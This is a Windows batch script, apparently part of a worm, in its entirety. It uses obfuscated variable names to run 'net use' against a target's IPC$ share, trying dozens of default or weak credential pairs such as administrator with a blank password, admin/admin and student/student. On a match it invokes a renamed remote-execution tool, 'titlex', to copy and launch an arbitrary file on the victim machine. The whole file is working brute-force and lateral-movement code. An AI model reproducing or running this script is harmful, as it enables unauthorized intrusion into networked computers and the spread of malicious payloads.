@echo off
SeT D=u
SeT E=s
SeT F=e
SeT Co=ERRORLEVEL
SeT Ne=net
SeT liker=titlex
SeT LitK=goto
%Ne% %D%%E%%F% \\%1\IPC$ "xxyyzz" /user:administrator
if nOt %cO% 1 %LitK% l0yhr29
%Ne% %D%%E%%F% \\%1\IPC$ "abc" /user:administrator
if nOt %cO% 1 %LitK% l0yhr30
%Ne% %D%%E%%F% \\%1\IPC$ "student" /user:student
if nOt %cO% 1 %LitK% l0yhr31
%Ne% %D%%E%%F% \\%1\IPC$ "teacher" /user:teacher
if nOt %cO% 1 %LitK% l0yhr32
%Ne% %D%%E%%F% \\%1\IPC$ "" /user:user
if nOt %cO% 1 %LitK% l0yhr33
%Ne% %D%%E%%F% \\%1\IPC$ "user" /user:user
if nOt %cO% 1 %LitK% l0yhr34
%Ne% %D%%E%%F% \\%1\IPC$ "test" /user:test
if nOt %cO% 1 %LitK% l0yhr4
%Ne% %D%%E%%F% \\%1\IPC$ "test123" /user:administrator
if nOt %cO% 1 %LitK% l0yhr5
%Ne% %D%%E%%F% \\%1\IPC$ "1" /user:administrator
if nOt %cO% 1 %LitK% l0yhr26
%Ne% %D%%E%%F% \\%1\IPC$ "123" /user:administrator
if nOt %cO% 1 %LitK% l0yhr27
%Ne% %D%%E%%F% \\%1\IPC$ "12345" /user:admin
if nOt %cO% 1 %LitK% l0yhr28
%Ne% %D%%E%%F% \\%1\IPC$ "temp" /user:administrator
if nOt %cO% 1 %LitK% l0yhr6
%Ne% %D%%E%%F% \\%1\IPC$ "" /user:administrator
if nOt %cO% 1 %LitK% l0yhr1
%Ne% %D%%E%%F% \\%1\IPC$ "" /user:administrator
if nOt %cO% 1 %LitK% l0yhr35
%Ne% %D%%E%%F% \\%1\IPC$ "Administrator" /user:administrator
if nOt %cO% 1 %LitK% l0yhr2
%Ne% %D%%E%%F% \\%1\IPC$ "Administrator" /user:administrator
if nOt %cO% 1 %LitK% l0yhr37
%Ne% %D%%E%%F% \\%1\IPC$ "test" /user:administrator
if nOt %cO% 1 %LitK% l0yhr3
%Ne% %D%%E%%F% \\%1\IPC$ "admin" /user:administrator
if nOt %cO% 1 %LitK% l0yhr10
%Ne% %D%%E%%F% \\%1\IPC$ "temp123" /user:administrator
if nOt %cO% 1 %LitK% l0yhr7
%Ne% %D%%E%%F% \\%1\IPC$ "pass" /user:administrator
if nOt %cO% 1 %LitK% l0yhr8
%Ne% %D%%E%%F% \\%1\IPC$ "password" /user:administrator
if nOt %cO% 1 %LitK% l0yhr9
%Ne% %D%%E%%F% \\%1\IPC$ "root" /user:root
if nOt %cO% 1 %LitK% l0yhr11
%Ne% %D%%E%%F% \\%1\IPC$ "changeme" /user:administrator
if nOt %cO% 1 %LitK% l0yhr12
%Ne% %D%%E%%F% \\%1\IPC$ "admin" /user:admin
if nOt %cO% 1 %LitK% l0yhr13
%Ne% %D%%E%%F% \\%1\IPC$ "123456" /user:administrator
if nOt %cO% 1 %LitK% l0yhr14
%Ne% %D%%E%%F% \\%1\IPC$ "654321" /user:administrator
if nOt %cO% 1 %LitK% l0yhr15
%Ne% %D%%E%%F% \\%1\IPC$ "abc123" /user:administrator
if nOt %cO% 1 %LitK% l0yhr16
%Ne% %D%%E%%F% \\%1\IPC$ "12345" /user:administrator
if nOt %cO% 1 %LitK% l0yhr36
%Ne% %D%%E%%F% \\%1\IPC$ "red123" /user:administrator
if nOt %cO% 1 %LitK% l0yhr17
%Ne% %D%%E%%F% \\%1\IPC$ "admin123" /user:administrator
if nOt %cO% 1 %LitK% l0yhr18
%Ne% %D%%E%%F% \\%1\IPC$ "qwerty" /user:administrator
if nOt %cO% 1 %LitK% l0yhr19
%Ne% %D%%E%%F% \\%1\IPC$ "asdf" /user:administrator
if nOt %cO% 1 %LitK% l0yhr20
%Ne% %D%%E%%F% \\%1\IPC$ "password123" /user:administrator
if nOt %cO% 1 %LitK% l0yhr21
%Ne% %D%%E%%F% \\%1\IPC$ "secret" /user:administrator
if nOt %cO% 1 %LitK% l0yhr22
%Ne% %D%%E%%F% \\%1\IPC$ "qwertyuiop" /user:administrator
if nOt %cO% 1 %LitK% l0yhr23
%Ne% %D%%E%%F% \\%1\IPC$ "12345" /user:administrator
if nOt %cO% 1 %LitK% l0yhr24
%Ne% %D%%E%%F% \\%1\IPC$ "54321" /user:administrator
if nOt %cO% 1 %LitK% l0yhr25
%LitK% raide
:l0yhr1
%liker% \\%1 -u administrator -p "" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "" -d %2 -o
%LitK% raide
:l0yhr10
%liker% \\%1 -u administrator -p "admin" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "admin" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "admin" -d %2 -o
%LitK% raide
:l0yhr2
%liker% \\%1 -u administrator -p "administrator" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "administrator" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "administrator" -d %2 -o
%LitK% raide
:l0yhr37
%liker% \\%1 -u administrator -p "Administrator" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "Administrator" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "Administrator" -d %2 -o
%LitK% raide
:l0yhr11
%liker% \\%1 -u root -p "root" -d attrib.exe -r %2
%liker% \\%1 -u root -p "root" -f -c -d %2 -o
%liker% \\%1 -u root -p "root" -d %2 -o
%LitK% raide
:l0yhr13
%liker% \\%1 -u admin -p "admin" -d attrib.exe -r %2
%liker% \\%1 -u admin -p "admin" -f -c -d %2 -o
%liker% \\%1 -u admin -p "admin" -d %2 -o
%LitK% raide
:l0yhr3
%liker% \\%1 -u administrator -p "test" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "test" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "test" -d %2 -o
%LitK% raide
:l0yhr4
%liker% \\%1 -u test -p "test" -d attrib.exe -r %2
%liker% \\%1 -u test -p "test" -f -c -d %2 -o
%liker% \\%1 -u test -p "test" -d %2 -o
%LitK% raide
:l0yhr5
%liker% \\%1 -u administrator -p "test123" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "test123" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "test123" -d %2 -o
%LitK% raide
:l0yhr6
%liker% \\%1 -u administrator -p "temp" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "temp" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "temp" -d %2 -o
%LitK% raide
:l0yhr7
%liker% \\%1 -u administrator -p "temp123" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "temp123" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "temp123" -d %2 -o
%LitK% raide
:l0yhr8
%liker% \\%1 -u administrator -p "pass" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "pass" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "pass" -d %2 -o
%LitK% raide
:l0yhr9
%liker% \\%1 -u administrator -p "password" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "password" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "password" -d %2 -o
%LitK% raide
:l0yhr12
%liker% \\%1 -u administrator -p "changeme" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "changeme" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "changeme" -d %2 -o
%LitK% raide
:l0yhr14
%liker% \\%1 -u administrator -p "123456" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "123456" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "123456" -d %2 -o
%LitK% raide
:l0yhr15
%liker% \\%1 -u administrator -p "654321" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "654321" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "654321" -d %2 -o
%LitK% raide
:l0yhr16
%liker% \\%1 -u administrator -p "abc123" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "abc123" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "abc123" -d %2 -o
%LitK% raide
:l0yhr17
%liker% \\%1 -u administrator -p "red123" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "red123" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "red123" -d %2 -o
%LitK% raide
:l0yhr18
%liker% \\%1 -u administrator -p "admin123" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "admin123" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "admin123" -d %2 -o
%LitK% raide
:l0yhr19
%liker% \\%1 -u administrator -p "qwerty" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "qwerty" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "qwerty" -d %2 -o
%LitK% raide
:l0yhr20
%liker% \\%1 -u administrator -p "asdf" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "asdf" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "asdf" -d %2 -o
%LitK% raide
:l0yhr21
%liker% \\%1 -u administrator -p "password123" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "password123" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "password123" -d %2 -o
%LitK% raide
:l0yhr22
%liker% \\%1 -u administrator -p "secret" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "secret" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "secret" -d %2 -o
%LitK% raide
:l0yhr23
%liker% \\%1 -u administrator -p "qwertyuiop" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "qwertyuiop" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "qwertyuiop" -d %2 -o
%LitK% raide
:l0yhr24
%liker% \\%1 -u administrator -p "12345" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "12345" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "12345" -d %2 -o
%LitK% raide
:l0yhr25
%liker% \\%1 -u administrator -p "54321" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "54321" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "54321" -d %2 -o
%LitK% raide
:l0yhr26
%liker% \\%1 -u administrator -p "1" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "1" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "1" -d %2 -o
%LitK% raide
:l0yhr27
%liker% \\%1 -u administrator -p "123" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "123" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "123" -d %2 -o
%LitK% raide
:l0yhr28
%liker% \\%1 -u admin -p "12345" -d attrib.exe -r %2
%liker% \\%1 -u admin -p "12345" -f -c -d %2 -o
%liker% \\%1 -u admin -p "12345" -d %2 -o
%LitK% raide
:l0yhr29
%liker% \\%1 -u administrator -p "xxyyzz" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "xxyyzz" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "xxyyzz" -d %2 -o
%LitK% raide
:l0yhr30
%liker% \\%1 -u administrator -p "abc" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "abc" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "abc" -d %2 -o
%LitK% raide
:l0yhr31
%liker% \\%1 -u student -p "student" -d attrib.exe -r %2
%liker% \\%1 -u student -p "student" -f -c -d %2 -o
%liker% \\%1 -u student -p "student" -d %2 -o
%LitK% raide
:l0yhr32
%liker% \\%1 -u teacher -p "teacher" -d attrib.exe -r %2
%liker% \\%1 -u teacher -p "teacher" -f -c -d %2 -o
%liker% \\%1 -u teacher -p "teacher" -d %2 -o
%LitK% raide
:l0yhr33
%liker% \\%1 -u user -p "" -d attrib.exe -r %2
%liker% \\%1 -u user -p "" -f -c -d %2 -o
%liker% \\%1 -u user -p "" -d %2 -o
%LitK% raide
:l0yhr34
%liker% \\%1 -u user -p "user" -d attrib.exe -r %2
%liker% \\%1 -u user -p "user" -f -c -d %2 -o
%liker% \\%1 -u user -p "user" -d %2 -o
%LitK% raide
:l0yhr35
%liker% \\%1 -u administrator -p "" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "" -d %2 -o
%LitK% raide
:l0yhr36
%liker% \\%1 -u administrator -p "12345" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "12345" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "12345" -d %2 -o
%LitK% raide
:raide
;;;;;;;;;;;;blah;;;;;;;;;;;;;;;;
;;;;;;;;;;;;blah;;;;;;;;;;;;;;;;
;;;;;;;;;;;;blah;;;;;;;;;;;;;;;;